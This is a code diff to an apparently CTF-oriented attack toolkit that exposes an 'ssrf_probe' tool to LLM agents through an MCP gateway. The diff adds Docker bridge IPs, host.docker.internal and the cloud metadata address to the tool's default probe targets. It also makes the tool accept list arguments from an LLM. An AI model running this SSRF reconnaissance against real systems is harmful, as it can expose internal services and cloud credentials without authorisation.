@@ -534,7 +534,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     # ── SSRF probe: Internal service discovery via SSRF vector ─────
     async def ssrf_probe(
         ssrf_url: str, url_param: str = "url", port_param: str = "",
-        internal_hosts: str = "localhost,127.0.0.1,internal,metadata,169.254.169.254,0.0.0.0",
+        internal_hosts: str = "localhost,127.0.0.1,internal,metadata,169.254.169.254,0.0.0.0,172.17.0.1,172.17.0.2,172.17.0.3,172.17.0.4,172.18.0.1,172.18.0.2,172.18.0.3,host.docker.internal",
         ports: str = "80,443,8080,5000,3000,8000,9200,5984,8500",
         paths: str = "/,/flag,/flag.txt,/admin,/api,/health,/status,/metadata",
     ) -> ToolResult:
@@ -547,6 +547,14 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         import asyncio, time, urllib.parse, json as _json
         start = time.perf_counter()
         results: list[dict] = []
+        # Normalize list/tuple inputs to comma-separated strings.
+        # LLM-generated tool_args may pass lists instead of strings.
+        if isinstance(internal_hosts, (list, tuple)):
+            internal_hosts = ",".join(str(h) for h in internal_hosts)
+        if isinstance(ports, (list, tuple)):
+            ports = ",".join(str(p) for p in ports)
+        if isinstance(paths, (list, tuple)):
+            paths = ",".join(str(p) for p in paths)
         hosts = [h.strip() for h in internal_hosts.split(",") if h.strip()]
         port_list = [p.strip() for p in ports.split(",") if p.strip()]
         path_list = [p.strip() for p in paths.split(",") if p.strip()]
@@ -621,12 +629,12 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     gateway.register(
         name="ssrf_probe",
         func=ssrf_probe,
-        description="Discover internal services through an SSRF vector. Given an SSRF endpoint URL, probes common internal hosts (localhost, 127.0.0.1, internal, 169.254.169.254/cloud metadata) and ports for accessible services. Automatically extracts flags from responses. Use when web application has a URL fetch/proxy/redirect feature.",
+        description="Discover internal services through an SSRF vector. Given an SSRF endpoint URL, probes common internal hosts (localhost, 127.0.0.1, Docker bridge IPs 172.17-18.0.x, host.docker.internal, cloud metadata 169.254.169.254) and ports for accessible services. When running inside containers, internal services are often on Docker bridge IPs rather than localhost. Automatically extracts flags from responses. Use when web application has a URL fetch/proxy/redirect feature.",
         parameters={
             "ssrf_url": {"type": "string", "description": "The SSRF-vulnerable endpoint URL (e.g. 'http://target:10110/fetch')"},
             "url_param": {"type": "string", "description": "URL parameter name for the SSRF query (default 'url')"},
             "port_param": {"type": "string", "description": "Optional port parameter name if separate from url_param"},
-            "internal_hosts": {"type": "string", "description": "Comma-separated internal hosts to probe (default: localhost,127.0.0.1,internal,metadata,169.254.169.254)"},
+            "internal_hosts": {"type": "string", "description": "Comma-separated internal hosts to probe (default includes localhost, 127.0.0.1, Docker bridge IPs 172.17-18.0.x, host.docker.internal, cloud metadata 169.254.169.254)"},
             "ports": {"type": "string", "description": "Comma-separated ports to probe (default: 80,443,8080,5000,3000)"},
             "paths": {"type": "string", "description": "Comma-separated paths to probe (default: /,/flag,/flag.txt,/admin,/api)"},
         },
